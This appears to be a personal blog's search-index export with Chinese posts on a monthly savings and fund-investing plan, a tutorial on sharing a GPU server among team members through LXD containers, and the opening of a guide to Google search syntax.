9月的储蓄率为60.5%，整体结余情况为0。\n这个月国庆节回到了老家，导致预算严重超支，达到了3484元，估计往后的大半年时间得慢慢分摊了，也算是开局来了一个当头一棒。\n除此之外，从9月开始，增加了应急资金账户，应急资金账户是预计存够1年的生活费（后期可能增加），所以将储蓄和投资的一部分钱分摊到该账户当中了。\n9月份预算实施情况如下：\n投资组合 投资组合这个月做了更新，增加了可以投资海外市场的QDII基金，我目前采用80%国内市场+20%海外市场，国内则进一步分为50%的偏股+30%债券，海外则是70%的偏股+30%债券。\n投资海外市场本质也是一种风险分摊，但目前海外市场美股中，大部分我个人觉得在比较高的位置，可能后期虽然按照相关比例投资，但可能会考虑将一部分投入海外的基金放入到货币中备用。\n愿望清单 愿望清单中的Apple Watch已进入删除队列，已无购买欲望，同时增加了Apple Pencli和空气净化器，电子笔的作用主要最近发现书比较麻烦，用IPad反而方便携带和看书，所以有了这个想法。\n净化器则是准备12月月初准备搬进新房子，有点担心安全问题，所以净化器加入待选名单，其中两个净化器都是小米出的具备甲醛催化技术的净化器。\n这个东西我查阅了资料，发现和之前的除甲醛方案不一样，之前的除甲醛方案是通过滤芯（带活性炭）进行吸附，而长时间下来，滤芯里面堆积了甲醛不说，还会随着使用，效果也慢慢降低。而小米的这个催化技术则是将其分解成二氧化碳和水，并且官方声称的不用更换催化滤芯，有兴趣的朋友可以看看拆废 7 个净化器滤芯，除甲醛怎么选空气净化器？_哔哩哔哩_bilibili。\n同时之前的大部分净化器滤芯是采用的复合滤芯，也就是活性炭涂层都在一起，那这就有个问题，装修过房子的朋友都知道，活性炭的炭包在使用一段时间后，可以通过在阳光下的爆晒，将其内部吸附的物质释放出去，从而可以达到重复利用，但是对于复合滤芯无法达到了，要不然一起换要不然就不换。\n而小米全效净化器以及Ultra款，活性炭是单独分开的，这也就是说可以无形中省下一部分钱。\n彩蛋 关于前言做的回测，发现实际上算的结果有问题，所以在后面进行更正，也欢迎讨论，拜了个拜。","title":"#2-极光计划实证：当头一棒"},{"content":"前言 这是一篇关于投资的文章，也是第一期（较为啰嗦），记录了一个30岁的男人，通过理财、投资，在45岁之前达到”财务自由“，对于财务自由，我比较赞同也大的这篇文章中提到的定义，\n被动收入：充足的本金和投资能力，并且投资的收益能够覆盖全部的生活支出。 为自己而活：而财务自由的在于通过财务自由让自己将时间投入到热爱的事情上。 简单富足：无需大富大贵，只保证体面、正常的生活开销。 关于该计划，也是一路学习、摸索过来，从大概今年开始断断续续的学习投资、理财，期间也关注了很多的优秀博主，大量泛读文章，如今也算是摸着一点门槛了，期间觉得博主通过理财投资完成了一些\u0026quot;退休计划\u0026quot;，比较憧憬，所以也就有了这个计划。\n对于计划这个事，我在之前早早就有了几次规划，但是觉得不太成熟，就一直迭代、反复否定、学习，才产生了这次自己觉得比较靠谱的方案，而这个”靠谱“不是这个计划一定能赚钱，而是来自于对计划中投资的东西有个七七八八的了解，知道自己投的是什么，知道投的基金会投什么。\n虽然自己仍然处于学习的过程中，但是回顾之前学习投资理财的过程，发现仍然还是踩了非常多的坑，我学习方式是通过孟岩创建的”有知有行“为主线，然后再结合大量的文章碎片化学习，这样的方式好处在于不枯燥、见效快、现学现用。\n但上面提到的这种方式也有坏处，因为缺少底层理论支撑，越到后面越容易显现出理论不足的缺陷，所以在学习投资理财的过程中发现，学习一门新的知识，时间充足下还是建议从理论开始，而关于从理论开始学习打基础的时候，框架很重要，而学习的框架有很多可以借鉴，比如”简七读财“的文章所提到的：\n入门可以参考一下理财规划师的培训教材，或者银行 / 基金 / 证券公司从业人员资格考试的基础教材，都可以快速建立起一个专业框架\n说多了，还是回头来说说”极光计划“，为什么叫”极光“呢？因为我从很早之前一直都想去一次挪威看看极光，并且可以住在下图这样的民宿中，所以这个计划叫”极光计划“也算是一个愿景了。\n这个计划我打算耗时15年，时间够长，但随着自身的竞争力提升，可能工资会上涨，所以计划提前也是很正常，当然不排除失业、工资降低等导致计划无法执行下去。\n明确的计划 财务自由的目标是采用”躺赚“的方式，存够300万，因我本身涉及到部分买房的借钱以及贷款，所以每个月准备拿40%钱用于投资，然后按照15年内平均年化在10%，也就差不多了。\n当然这个自己也不是自己凭空想象出来的，而是通过大致估算（因为前期没有认真记账和做预算，所以根据自己的年收入和存款率做了一个估算）大概需要每年20-25万的生活开销，再按照投资的10%的收益，取其中7%作为每年的生活费用（3%不算入是因为防止通货膨胀），所以这样算下来每年也就是需要300万的资金。\n关于每个月需要存多少钱，然后最终按照理想情况的需要多少月，可以通过(Investment Calculator)工具进行估算。\n提升收入 没有一夜暴富，要慢慢接受变富，普通人投资的钱绝大部分来自于工资收入，所以努力提升自身的竞争力，在投资上专业人士为了提升百分之几的收益率想尽办法，自己有这个闲心去研究提升收益率（研究了也是白研究），不如提升自己的竞争力，从而提高工资比这个容易多了。\n开始储蓄 规划自己的工资最好的方式来自于预算，预算表面看来是限制消费，而实际上预算是在合理的情况下保证消费合理，不会因为有预算降低了自己的幸福感。\n关于预算建议用表格先把自己的收入、开销列出来，然后就知道自己每月的整体情况，然后每月的预算控制推荐用MoneyWIZ，网上有很多的教程。\n投资意识 投资需要注意两个事情，第一个是慢慢变富，第二个投资本质就是认知变现的过程。世界上没有一夜暴富，也不是说要等”有钱“才能理财，并且在这个过程中投资的本质也是你将你学习到的知识变现的过程，让钱自己赚钱，即被动收入，所以持续的学习投资也是持续的变现的过程。\n理性决策 生活中有非常多的决策，比如是否换手机、是否换车、是先买房还是先投资等，这些都需要理性的决策。\n目前我采用的是两个工具，第一个是”愿望清单“，我把愿望清单看作冷静期等待工具，比如当我想买一个Apple Watch的时候，我就先丢进愿望清单，并且设置一个优先级别”高“，然后每周检查一遍清单，过了4周，我基本上将Apple Watch的等级优先级降低为了”低“。同时每个月我会检查，前3个月加入愿望清单中的东西如果还保持低，那么就会删除这项，说明该物品只是一时兴起导致的购买欲望。\n第二个则是”致命三问“，通过如下三点审问自己，如果其中一点都不符合，说明需要考虑这个东西的实际是否有用了。\n零浪费Check：这笔消费符合零浪费原则吗？有没有和已有的物品功能重合？ 省钱Check：这笔消费能反过来省钱吗？ 节省时间Check：这笔消费能帮我省时间吗？省下的时间能变成钱吗？ 比如我想要买的Apple Watch：\n零浪费Check：没有重叠，但目前健身只需要电视即可以跟着做，Apple Watch只能采集数据的作用，有点浪费。 省钱Check：好像没有省钱的作用。 节省时间Check：好像没有省时间的作用。 根据上述的自问，Apple Watch实际只有第一条满足了，所以可以再观察观察。\n实证 上面的前言说完了，这部分就开始说说计划的主要内容，这部分主要包含了计划进度、预算以及储蓄情况、愿望清单、投资组合。\n实证我与每月月初的1-10日发布，用于记录上一月的情况。\n计划进度 当前极光计划完成度 0.1003%（当前资产 ÷ 目标资产），自 2023 年 8 月起，累计收益率 0.37%，浮盈 7.32 元。\n预算及储蓄 每个月所有生活预算为2910元，除此之外还设定了攒点钱、分摊预算、奖励预算三个预算，每个预算都设立了结余的功能，也就是当前月每月用完或者用超都会转移到下个月一起算。\n攒点钱的作用为每个月如果有结余的话，则把预算转移到这里面，分摊预算是遇见购买大件或者吃饭等非个人消费，将其放在这里面，其作用是后期每月分摊，直至其分摊完成，有点像自己搞的分期记录。\n8月份预算实施情况如下：\n愿望清单 愿望清单目前只有一个Apple Watch，并且优先级已经经过3周的调整至低了。\n投资组合 投资组合我目前采用的方式是前期抄作用，后期通过学习慢慢配置组合。目前照搬了股票类中的沪深300、中证红利、创业板、中证500，货币和债券全抄。\n目前自己分配股票60%，债券30%，货币10%。\n同时自己记录收益用了两个方式，第一个为有知有行的记账功能，主要用于记录整体的收益情况以及完成进度。第二个则为表格。\n","permalink":"/posts/aurora-project-1/","summary":"前言 这是一篇关于投资的文章，也是第一期（较为啰嗦），记录了一个30岁的男人，通过理财、投资，在45岁之前达到”财务自由“，对于财务自由，我比较赞同也大的这篇文章中提到的定义，\n被动收入：充足的本金和投资能力，并且投资的收益能够覆盖全部的生活支出。 为自己而活：而财务自由的在于通过财务自由让自己将时间投入到热爱的事情上。 简单富足：无需大富大贵，只保证体面、正常的生活开销。 关于该计划，也是一路学习、摸索过来，从大概今年开始断断续续的学习投资、理财，期间也关注了很多的优秀博主，大量泛读文章，如今也算是摸着一点门槛了，期间觉得博主通过理财投资完成了一些\u0026quot;退休计划\u0026quot;，比较憧憬，所以也就有了这个计划。\n对于计划这个事，我在之前早早就有了几次规划，但是觉得不太成熟，就一直迭代、反复否定、学习，才产生了这次自己觉得比较靠谱的方案，而这个”靠谱“不是这个计划一定能赚钱，而是来自于对计划中投资的东西有个七七八八的了解，知道自己投的是什么，知道投的基金会投什么。\n虽然自己仍然处于学习的过程中，但是回顾之前学习投资理财的过程，发现仍然还是踩了非常多的坑，我学习方式是通过孟岩创建的”有知有行“为主线，然后再结合大量的文章碎片化学习，这样的方式好处在于不枯燥、见效快、现学现用。\n但上面提到的这种方式也有坏处，因为缺少底层理论支撑，越到后面越容易显现出理论不足的缺陷，所以在学习投资理财的过程中发现，学习一门新的知识，时间充足下还是建议从理论开始，而关于从理论开始学习打基础的时候，框架很重要，而学习的框架有很多可以借鉴，比如”简七读财“的文章所提到的：\n入门可以参考一下理财规划师的培训教材，或者银行 / 基金 / 证券公司从业人员资格考试的基础教材，都可以快速建立起一个专业框架\n说多了，还是回头来说说”极光计划“，为什么叫”极光“呢？因为我从很早之前一直都想去一次挪威看看极光，并且可以住在下图这样的民宿中，所以这个计划叫”极光计划“也算是一个愿景了。\n这个计划我打算耗时15年，时间够长，但随着自身的竞争力提升，可能工资会上涨，所以计划提前也是很正常，当然不排除失业、工资降低等导致计划无法执行下去。\n明确的计划 财务自由的目标是采用”躺赚“的方式，存够300万，因我本身涉及到部分买房的借钱以及贷款，所以每个月准备拿40%钱用于投资，然后按照15年内平均年化在10%，也就差不多了。\n当然这个自己也不是自己凭空想象出来的，而是通过大致估算（因为前期没有认真记账和做预算，所以根据自己的年收入和存款率做了一个估算）大概需要每年20-25万的生活开销，再按照投资的10%的收益，取其中7%作为每年的生活费用（3%不算入是因为防止通货膨胀），所以这样算下来每年也就是需要300万的资金。\n关于每个月需要存多少钱，然后最终按照理想情况的需要多少月，可以通过(Investment Calculator)工具进行估算。\n提升收入 没有一夜暴富，要慢慢接受变富，普通人投资的钱绝大部分来自于工资收入，所以努力提升自身的竞争力，在投资上专业人士为了提升百分之几的收益率想尽办法，自己有这个闲心去研究提升收益率（研究了也是白研究），不如提升自己的竞争力，从而提高工资比这个容易多了。\n开始储蓄 规划自己的工资最好的方式来自于预算，预算表面看来是限制消费，而实际上预算是在合理的情况下保证消费合理，不会因为有预算降低了自己的幸福感。\n关于预算建议用表格先把自己的收入、开销列出来，然后就知道自己每月的整体情况，然后每月的预算控制推荐用MoneyWIZ，网上有很多的教程。\n投资意识 投资需要注意两个事情，第一个是慢慢变富，第二个投资本质就是认知变现的过程。世界上没有一夜暴富，也不是说要等”有钱“才能理财，并且在这个过程中投资的本质也是你将你学习到的知识变现的过程，让钱自己赚钱，即被动收入，所以持续的学习投资也是持续的变现的过程。\n理性决策 生活中有非常多的决策，比如是否换手机、是否换车、是先买房还是先投资等，这些都需要理性的决策。\n目前我采用的是两个工具，第一个是”愿望清单“，我把愿望清单看作冷静期等待工具，比如当我想买一个Apple Watch的时候，我就先丢进愿望清单，并且设置一个优先级别”高“，然后每周检查一遍清单，过了4周，我基本上将Apple Watch的等级优先级降低为了”低“。同时每个月我会检查，前3个月加入愿望清单中的东西如果还保持低，那么就会删除这项，说明该物品只是一时兴起导致的购买欲望。\n第二个则是”致命三问“，通过如下三点审问自己，如果其中一点都不符合，说明需要考虑这个东西的实际是否有用了。\n零浪费Check：这笔消费符合零浪费原则吗？有没有和已有的物品功能重合？ 省钱Check：这笔消费能反过来省钱吗？ 节省时间Check：这笔消费能帮我省时间吗？省下的时间能变成钱吗？ 比如我想要买的Apple Watch：\n零浪费Check：没有重叠，但目前健身只需要电视即可以跟着做，Apple Watch只能采集数据的作用，有点浪费。 省钱Check：好像没有省钱的作用。 节省时间Check：好像没有省时间的作用。 根据上述的自问，Apple Watch实际只有第一条满足了，所以可以再观察观察。\n实证 上面的前言说完了，这部分就开始说说计划的主要内容，这部分主要包含了计划进度、预算以及储蓄情况、愿望清单、投资组合。\n实证我与每月月初的1-10日发布，用于记录上一月的情况。\n计划进度 当前极光计划完成度 0.1003%（当前资产 ÷ 目标资产），自 2023 年 8 月起，累计收益率 0.37%，浮盈 7.32 元。\n预算及储蓄 每个月所有生活预算为2910元，除此之外还设定了攒点钱、分摊预算、奖励预算三个预算，每个预算都设立了结余的功能，也就是当前月每月用完或者用超都会转移到下个月一起算。\n攒点钱的作用为每个月如果有结余的话，则把预算转移到这里面，分摊预算是遇见购买大件或者吃饭等非个人消费，将其放在这里面，其作用是后期每月分摊，直至其分摊完成，有点像自己搞的分期记录。\n8月份预算实施情况如下：\n愿望清单 愿望清单目前只有一个Apple Watch，并且优先级已经经过3周的调整至低了。\n投资组合 投资组合我目前采用的方式是前期抄作用，后期通过学习慢慢配置组合。目前照搬了股票类中的沪深300、中证红利、创业板、中证500，货币和债券全抄。\n目前自己分配股票60%，债券30%，货币10%。","title":"#1-极光计划实证：启航"},{"content":"环境 CPU: Intel(R) Xeon(R) Gold 6154* 2\nMomery: 128G GPU: 3080TI * 2\nDisk: 16T HD \u0026amp; 512 SSD\nSystem: Ubuntu 22.04 Server\n前言 因为最近团队对于GPU的需求量增加，但之前都是在工作电脑上直接使用GPU进行训练和使用，而几个人中只有一两台电脑有显卡，所以后期就更新了服务器。 随之而来的就会产生一个问题，大家直接用账号密码链接上去每个人的环境、配置都会造成环境、冲突，甚至导致系统出错，所有就有必要通过容器的解决方案让每个人都隔离，相互不影响，并且不能直接操作到宿主机，以保证所有人操作都在容器进行而不影响到宿主机，除此之外也需要给每一个容器映射显卡。 在这个基础上有三个相关的技术，分别为Docker、LXC、虚拟机（PVE、ESXI等）。首先排除掉Docker，Docker比较适用应用级的层面上，不符合需求。虚拟机虽然可以直通显卡等，但直通单张显卡后，其他虚拟机无法使用。所以最后就锁定到了LXD，LXD由Canonical有限公司发起，是一个类容器管理系统，而底层则基于LXC容器，额外提供了更加方便的API接口、分布式、网络管理、储存管理等，同时Ubuntu 22.04自集成了LXD，所以这里部署也是通过LXD来管理LXC容器。\n准备 16T的机械盘，分为两个分区（分区可以使用fdisk），分1T用于给LXC作储存池，剩余的15T用于挂载到宿主机下的/data目录，后期映射到每个容器的/data目录下，用于所有容器之间的数据互传和数据存储（因为相互之间的数据不涉及隐私，所以可以共用），这样的好处在于大家都将重要的数据放置/data，即使容器出现了问题，也不会影响到数据的丢失问题。 显卡驱动可以直接通过Ubuntu的GPU驱动安装，如果你没有安装显卡驱动，你可以直接输入nvidia-smi，会得到相关的提示，而不用安装网上的教程去设置，因为非常麻烦。 使用apt安装zfsutils-linux，前者用于安装LXD的储存池驱动，LXD支持多种储存池，这用于储存LXD、LXC相关的数据。 使用apt安装bridge-utils，该工具是用于管理和创建网桥设备所需要的工具和程序。 初始化LXD 通过命令执行sudo lxd init，就会得到如下的问题：\nLXD Clustering：用于集群配置，单节点不需要，默认为no，回车即可 new storage pool：需要创建一个存储池，输入yes Name of storage pool：给存储池命名，默认为default，回车即可 storage backend：存储后端，默认使用zfs，回车即可 Create a new ZFS pool：需要创建一个ZFS池，默认为no，输入yes use an existing block device：使用现有的块设备（硬盘），输入yes Path to block device：输入现有的硬盘，比如我的为sda1，那么就输入/dev/sda1 MAAS server：MAAS是一个用于将物理机视为云服务器的集群服务，默认为no，回车即可 new local network bridge：是否创建一个新的桥接网络，输入yes new bridge be called：命名新的网桥名称，默认即可 IPv4：IPv4相关配置，默认为auto，回车即可 IPv6：IPv6相关配置，默认为auto，回车即可 would you like lxd to be available over the network：使用想通过网络访问LXD，默认为no，回车即可 would you like stale cached images to be updated automatically：默认yes，回车即可 YAML printed：是否打印出lxd init的配置信息，默认为no，回车即可 创建容器模板 创建容器模板的意义在于你可以设置一个基础配置的容器，然后基于这个容器进行复制出多个容器出来，而不用再针对每个容器进行重复的基础设置。 在使用前需要下载一个已打包的容器镜像，因为需要下载，所以可以使用清华大学的国内镜像用于提升下载镜像的速度。 添加清华大学镜像源：\nsudo lxc remote add tuna-images https://mirrors.tuna.tsinghua.edu.cn/lxc-images/ --protocol=simplestreams --public 通过查找镜像列表，找到对应镜像的ID：\nsudo lxc image list tuna-images: | grep \u0026#34;ubuntu/18\u0026#34; 获取到列表后，选择对应的版本，这里我选择了id为2c44d2a68b29的ubuntu/18.04 (7 more)镜像，这是因为该版本标识了类型为容器CONTAINER。 确定好后远程的容器镜像id后，将其下载到本地并启动：\n# origin为源，这里使用上面添加的清华源，FINGERPRINT代表该源下载容器镜像id，ContainerName为创建的容器名称 sudo lxc launch origin:\u0026lt;FINGERPRINT\u0026gt; \u0026lt;ContainerName\u0026gt; # 我这里直接使用 sudo lxc launch tuna-images:2c44d2a68b29 gpuTemplate 查看是否启动成功容器可以使用sudo lxc list。\n创建公共目录 在准备阶段中宿主机的/data目录已挂载好了15T的分区，需要将其添加到上面创建的容器中：\nsudo lxc config device add \u0026lt;ContainerName\u0026gt; \u0026lt;ShareName\u0026gt; disk source=\u0026lt;host_dir_path\u0026gt; path=\u0026lt;Container_dir_path\u0026gt; #实例： sudo lxc config device add gpuTemplate share_dir disk source=/data path=/data 容器配置 因为将该容器作为基础模板，所以需要配置一些常用的依赖以及切换为国内apt源。 通过以下命令进入到容器内部：\nsudo lxc exec \u0026lt;ContainerName\u0026gt; bash 然后修改容器内部的apt源：\nvi /etc/apt/sources.list 然后将国内源写入该文件后，运行apt update更新列表即可。 安装vim、gcc、g++、make、cmake、python、lspci：\napt install vim gcc g++ make cmake python3.10 pciutils 安装Python后，将可执行文件放在/usr/bin/python3.10，所以直接需要将python3.10可执行文件软连接到当前目录为python，这样直接可以使用python命令。\nln -s /usr/bin/python3.10 /usr/bin/python 添加GPU设备到容器中 为容器添加所有GPU:\nsudo lxc config device add \u0026lt;ContainerName\u0026gt; gpu gpu 添加指定GPU：\nsudo lxc config device add \u0026lt;ContainerName\u0026gt; gpu0 gpu id=0 安装GPU驱动，网上教程中的GPU驱动安装比较麻烦，所以可以在宿主机中安装ubuntu-drivers：\napt install ubuntu-drivers-common 安装完成后使用以下命令，会得到显卡型号、推荐的显卡驱动：\nubuntu-drivers devices #返回 == /sys/devices/pci0000:3a/0000:3a:02.0/0000:3b:00.0 == modalias : pci:v000010DEd00002208sv000010DEsd00001535bc03sc00i00 vendor : NVIDIA Corporation model : GA102 [GeForce RTX 3080 Ti] manual_install: True driver : nvidia-driver-470-server - distro non-free driver : nvidia-driver-470 - distro non-free driver : nvidia-driver-515 - distro non-free driver : nvidia-driver-510 - distro non-free driver : nvidia-driver-510-server - distro non-free driver : nvidia-driver-515-open - distro non-free recommended driver : nvidia-driver-515-server - distro non-free driver : xserver-xorg-video-nouveau - distro free builtin 在这里我选择的是nvidia-driver-515-server版，然后进行到容器内部后，使用apt install nvidia-driver-515-server进行安装，安装完成后，你在容器内部使用nvidia-smi即可看见相关信息表示安装成功。 关于如果要特定的cuda版本则需要根据具体情况选择对应的显卡驱动。\n配置容器的远程登陆 安装ssh：\napt install openssh-server 安装完成后可以通过以下命令查看是否启动：\nsystemctl status sshd 配置完成后，可以找一台内网的机器通过ssh-keygen -t rsa生成非对称加密的密钥，然后将公钥的内容复制到容器内部/root/.ssh/authorized_keys文件中，保存退出，最后重启ssh服务：\nsystemctl restart sshd 配置完成后，回到宿主机中，设置端口映射，目的在于当宿主机接到的目标端口的请求的时候，将数据传输到指定端口的容器内部中，在这里配置的是sshd远程连接，所以容器接收的端口为22，宿主机的监听端口则是设置为6001，当宿主机的6001端口接到数据就转发给容器内部的22端口。 设置命令可以通过下面的代码设置：\nsudo lxc config device add \u0026lt;ContainerName\u0026gt; \u0026lt;name\u0026gt; proxy listen=tcp:\u0026lt;host_ip\u0026gt;:\u0026lt;host_port\u0026gt; connect=tcp:\u0026lt;container_ip\u0026gt;:\u0026lt;container_port\u0026gt; bind=host #这里我的设置为： sudo lxc config device add GPUTemplate testssh proxy listen=tcp:192.168.1.102:6001 connect=tcp:10.180.194.93:22 bind=host 如果后期要删除该条测试端口映射，则使用以下的命令：\n# 查看配置项目 sudo lxc config device list \u0026lt;ContainerName\u0026gt; # 找到需要删除的端口别称，然后删除 sudo lxc config device remove \u0026lt;ContainerName\u0026gt; \u0026lt;config_name\u0026gt; 制作容器实例 制作容器实例实际上就是基于现有运行的实例进行复制一份，然后再做一点基础的修改就可以让他人使用。 复制容器：\nsudo lxc copy \u0026lt;ContainerTemplateName\u0026gt; \u0026lt;newContainerName\u0026gt; 复制后，需要手动启动\nsudo lxc start \u0026lt;newContainerName\u0026gt; 复制完成后，可以按照上述的步骤设置使用者的ssh key和端口映射即可。\n参考文章 https://shenxiaohai.me/2018/12/03/gpu-server-lab/ https://linuxcontainers.org/lxd/introduction/ https://zh.wikipedia.org/wiki/LXC https://linuxcontainers.org/lxd/docs/master/explanation/storage/ https://linuxcontainers.org/lxd/docs/master/explanation/networks/ https://blog.csdn.net/zhw864680355/article/details/90411288 https://developer.nvidia.com/cuda-toolkit-archive https://www.cnblogs.com/booturbo/p/13960935.html https://pytorch.org/get-started/locally/ https://www.jianshu.com/p/978bc51029fa https://command-not-found.com/ubuntu-drivers https://www.myfreax.com/how-to-nvidia-drivers-on-ubuntu-20-04/ https://blog.csdn.net/Guzarish/article/details/118626384 https://blog.csdn.net/dou3516/article/details/120823932 https://developer.aliyun.com/article/971986 ","permalink":"/posts/gpu-server-lxd-multiplexing/","summary":"环境 CPU: Intel(R) Xeon(R) Gold 6154* 2\nMomery: 128G GPU: 3080TI * 2\nDisk: 16T HD \u0026amp; 512 SSD\nSystem: Ubuntu 22.04 Server\n前言 因为最近团队对于GPU的需求量增加，但之前都是在工作电脑上直接使用GPU进行训练和使用，而几个人中只有一两台电脑有显卡，所以后期就更新了服务器。 随之而来的就会产生一个问题，大家直接用账号密码链接上去每个人的环境、配置都会造成环境、冲突，甚至导致系统出错，所有就有必要通过容器的解决方案让每个人都隔离，相互不影响，并且不能直接操作到宿主机，以保证所有人操作都在容器进行而不影响到宿主机，除此之外也需要给每一个容器映射显卡。 在这个基础上有三个相关的技术，分别为Docker、LXC、虚拟机（PVE、ESXI等）。首先排除掉Docker，Docker比较适用应用级的层面上，不符合需求。虚拟机虽然可以直通显卡等，但直通单张显卡后，其他虚拟机无法使用。所以最后就锁定到了LXD，LXD由Canonical有限公司发起，是一个类容器管理系统，而底层则基于LXC容器，额外提供了更加方便的API接口、分布式、网络管理、储存管理等，同时Ubuntu 22.04自集成了LXD，所以这里部署也是通过LXD来管理LXC容器。\n准备 16T的机械盘，分为两个分区（分区可以使用fdisk），分1T用于给LXC作储存池，剩余的15T用于挂载到宿主机下的/data目录，后期映射到每个容器的/data目录下，用于所有容器之间的数据互传和数据存储（因为相互之间的数据不涉及隐私，所以可以共用），这样的好处在于大家都将重要的数据放置/data，即使容器出现了问题，也不会影响到数据的丢失问题。 显卡驱动可以直接通过Ubuntu的GPU驱动安装，如果你没有安装显卡驱动，你可以直接输入nvidia-smi，会得到相关的提示，而不用安装网上的教程去设置，因为非常麻烦。 使用apt安装zfsutils-linux，前者用于安装LXD的储存池驱动，LXD支持多种储存池，这用于储存LXD、LXC相关的数据。 使用apt安装bridge-utils，该工具是用于管理和创建网桥设备所需要的工具和程序。 初始化LXD 通过命令执行sudo lxd init，就会得到如下的问题：\nLXD Clustering：用于集群配置，单节点不需要，默认为no，回车即可 new storage pool：需要创建一个存储池，输入yes Name of storage pool：给存储池命名，默认为default，回车即可 storage backend：存储后端，默认使用zfs，回车即可 Create a new ZFS pool：需要创建一个ZFS池，默认为no，输入yes use an existing block device：使用现有的块设备（硬盘），输入yes Path to block device：输入现有的硬盘，比如我的为sda1，那么就输入/dev/sda1 MAAS server：MAAS是一个用于将物理机视为云服务器的集群服务，默认为no，回车即可 new local network bridge：是否创建一个新的桥接网络，输入yes new bridge be called：命名新的网桥名称，默认即可 IPv4：IPv4相关配置，默认为auto，回车即可 IPv6：IPv6相关配置，默认为auto，回车即可 would you like lxd to be available over the network：使用想通过网络访问LXD，默认为no，回车即可 would you like stale cached images to be updated automatically：默认yes，回车即可 YAML printed：是否打印出lxd init的配置信息，默认为no，回车即可 创建容器模板 创建容器模板的意义在于你可以设置一个基础配置的容器，然后基于这个容器进行复制出多个容器出来，而不用再针对每个容器进行重复的基础设置。 在使用前需要下载一个已打包的容器镜像，因为需要下载，所以可以使用清华大学的国内镜像用于提升下载镜像的速度。 添加清华大学镜像源：","title":"GPU服务器的多人环境搭建"},{"content":"前言 学习Google搜索，其目的是用于让自己得到更精准的信息，所以善用Google搜索对于信息收集、安全测试、查找答案等都有着非常大的帮助。而随着时间的变化Google对于语法的更新、规则都在改动，这些改动对于结果都有影响，所以使用前进行测试是非常有必要的。 查阅了诸多资料过后，将Google搜索的操作分为了三个等级，分别为基础搜索、布尔操作符、高级操作符，每个级别的都可以进行配合使用，有些组合起来能够让搜索更加精准，而有些则是不能进行组合。 同时这些搜索方式会与高级搜索设置中的功能重叠，但个人偏向使用语法对比高级搜索设置方便许多，所以后面的内容均使用语法，不会涉及到搜索设置等。 除此之外，还有诸多的网站可以获取到Google语法的途径，比如exploit-db是一个用于记录安全测试的Google语法数据库，这里面记录了非常多因配置失误操作的漏洞，如获取sql备份文件sql.bak等。Google Help提供常用的Google语法等。\n影响搜索的因素 Google在搜索原理的一篇简单的介绍了会影响搜索结果的几个因素，分别为以下7个因素：\n如果为中文，需要进行分词、语法等NLP技术的信息提取。\n查询理解，这个步骤典型的就是修正错别字，比如你搜索“贝京市”，那么算法会将关键词进行修正为“北京市”，所以返回的内容中也是“北京市”相关的内容。这个步骤我没有找到具体的文献，但和步骤1是有较强的联系。\n内容相关性，这个步骤典型的作用就是搜索网页中任何地方是否出现与关键词命中。\n内容质量，这个步骤用于确定网页是否具备权威、专业等，除了常见的网站认证、知名度、访问量等，还有Google的基于网页链接的算法，如PageRank，这种算法类似于投票，越权威的网站被引用/超链接的次数越多。基于这些情况然后进行排序，将这些高质量的网站靠前输出。\n网页可用性，这个步骤用于确定网页是否网页是否“优秀”，而Google是有一套公开的标准，典型的就是网页加载速度、适配各个访问的客户端、是否HTTPS、广告等。\n上下文设置，这个步骤和自己的历史数据、设置有关系，比如你的历史搜索中多次搜索了“巴塞罗那对阿森纳”，当你搜索“巴塞罗那”的时候，可能更加想访问的是“巴塞罗那球队”而不是“巴塞罗那地区”，该部分的影响，可以通过Google搜索主页右下角设置中的“您在Google搜索中的数据设置”删除，或者直接使用无痕模式搜索可以消除该影响。 除了这个，地区也会导致你的搜索结果会有影响，在Google右下角设置中的“搜索设置”里面的“区域设置”可以验证，比如将该设置更改为美国，你搜索\u0026quot;football\u0026quot;则是返回的NFL橄榄球职业比赛联盟，而如果将地区设置为英国，返回的则是足球。\n符号，在Google搜索中符号如（、。，/等都不会影响搜索结果，比如你搜索的是/中国北京/，那么结果中\u0026quot;中国（北京\u0026hellip;\u0026ldquo;这样的结果也会匹配。\n基础搜索 基础搜索是最常见的，里面包含了两种搜索方式：\n关键词查询：关键词查询就是最常用的方式，直接输入关键词查询或者给出多个以空格间隔的关键词，如/中国北京/或者/中国 北京/。但需要注意的是使用关键词查询，会尽可能的分词和理解你的意图（影响搜索的因素中的步骤一），并尽可能的返回有关的内容，那么如/中国北京/，就有可能包含/中国北京/、/中国/、/北京/等结果返回。\n准确查询：精确查询用双引号包裹一个或者多个关键词，与关键词查询不同之处在于精确查询并不会对关键词进行分词，而是原封不动的进行完整的匹配，所以你搜索/中国北京/，就有可能包含\u0026quot;中国北京\u0026rdquo;、\u0026ldquo;中国\u0026rdquo;、\u0026ldquo;北京\u0026quot;等结果返回。而搜索/\u0026ldquo;中国北京\u0026rdquo;/，则代表每一个结果都按照\u0026quot;中国北京\u0026quot;这个词进行完整的匹配，不会出现\u0026quot;中国\u0026rdquo;、\u0026ldquo;北京\u0026quot;等结果返回。 而如果精确搜索给出了多个关键词，如/\u0026ldquo;中国 北京\u0026rdquo;/，则这个中间的空格代表着顺序，说所以可以理解为查询的含义为在\u0026quot;中国\u0026quot;这个词后紧跟着\u0026quot;北京\u0026quot;这个关键词。\n除了这两种搜索之外，还包含了几个符号：\n通配符：通配符*与程序中的通配符意义不一样，中文和英文搜索中这里的通配符代表的是一个词，比如/\u0026ldquo;北京市 故宫\u0026rdquo;/，将“京”替换为*，也就是/\u0026ldquo;北*市 故宫\u0026rdquo;/搜索，那么返回的结果中可能包含着如“北厦门市故宫”、\u0026ldquo;北秋田市故宮\u0026quot;等结果。如果将搜索改为/\u0026rdquo;*市 故宫\u0026rdquo;/，那么你看见命中的关键词（红色标注）则为“太保市故宮”、“北京市故宫”等词。所以这说明通配符匹配的是一个词，而不是一个字，作用是尽可能的将一个词与前后的关键字进行组合成一个完整的词。\n单字任意符：这个符号对于中文不太友好，中文下呈现的大多数能匹配到标点符号，而代表任意中文字符则不行，如搜索\u0026quot;湖北省\u0026quot;、\u0026ldquo;湖南省\u0026quot;等相关信息，所以语法为/\u0026ldquo;湖*省\u0026rdquo;/，但是返回的则是\u0026quot;湖省\u0026quot;和\u0026quot;湖（省\u0026rdquo;。 而对于英文则是能替代任意字符，比如/\u0026ldquo;hac*ing\u0026rdquo;/，则能搜索到\u0026quot;hacking\u0026quot;等结果。\n括号：Google搜索中对于括号是不敏感的，所以如 /北京(（市/ 搜索中放置了一个中文一个英文的括号，都会正常返回“北京市”结果，而在精确操作中同样适用，即/\u0026ldquo;北京(（市\u0026rdquo;/也能正确返回“北京市”的结果。 